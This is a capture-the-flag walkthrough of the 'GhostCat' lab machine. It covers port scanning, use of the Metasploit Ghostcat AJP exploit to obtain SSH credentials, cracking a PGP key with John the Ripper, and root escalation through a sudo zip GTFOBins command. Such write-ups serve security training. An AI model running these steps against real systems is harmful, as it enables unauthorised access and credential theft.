THE MACHINE IS GHOSTCAT


TOOLS USED

NMAP 
METASPLOIT
JOHN


For firts thing we run the tool name Nmap: 

	nmap -p- IPMACHINE

There are ports which they are:

	22/tcp   open  ssh
	53/tcp   open  domain
	8009/tcp open  ajp13
	8080/tcp open  http-proxy

we search on internet the information of they, the port 8009  use the protocol AJP(apache jserv protocol) and have an exploit called Ghostcat


For use this exploit we use metasploit tool's

open metasploit

	msfconsole

search the exploit

	search ghostcat

use that 
	
	use 0

set machine where use

	set RHOSTS <IP>

now run
	exploit 


we found the user and the password for ssh 
enter on ssh 
there are two file 

	credential.pgp tryhackme.asc

the file .asc have password for crack it we use john 	
generate the hash of file 

	gpg2john tryhackme.asc > hash.txt

now with jhon crak the pass

	john --wordlist=/usr/share/wordlists/rockyou.txt crack.txt

we have the password to open this file 
now to open the file .gpg use gpg tool's
import the file .asc

	gpg --import file.asc

now decrypt the file .gpg

	gpg --decrypt file.gpg file.asc 

insert the key cracked key whit john 
now we have a now credential for ssh

login whit that and take the flag in user.txt 

now do sudo -l

		sudo -l 

		 (root : root) NOPASSWD: /usr/bin/zip

search on GTFO and found the exploit for do the privilage escalation
run this command:

 	TF=$(mktemp -u)
 	sudo zip $TF /etc/hosts -T -TT 'sh #'
 	sudo rm $TF


now we are root, can open file root.txt and take the last flag 









